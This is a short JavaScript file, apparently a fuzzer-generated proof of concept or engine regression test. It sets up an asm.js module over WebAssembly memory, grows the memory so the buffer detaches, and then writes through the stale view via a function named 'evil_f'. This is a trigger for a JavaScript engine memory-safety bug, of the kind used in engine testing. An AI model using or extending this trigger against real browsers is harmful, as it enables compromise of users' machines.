function module(a1, a2, a3) {
    'use asm';
    const t2 = a1.Uint32Array;
    const v6 = new t2(a3);
    const v5 = v6;
    var fl = v5;
    function f1(a10) {
        const v12 = a10 | 0;
        a10 = v12;
        fl[0] = v12;
        fl[65536] = a10;
        fl[1048576] = a10;
    }
    return f1;
}
var global = { Uint32Array: Uint32Array };
var env = {};
const v17 = WebAssembly.Memory;
const v23 = new v17({ initial: 200 });
const v20 = v23;
memory = v20;
var buffer = memory.buffer;
evil_f = module(global, env, buffer);
zz = {};
function f29() {
    const v30 = [];
    Array.prototype.slice.call(v30);
    return 4294967295;
}
zz.toString = f29;
evil_f(3);
memory.grow(1);
evil_f(zz);
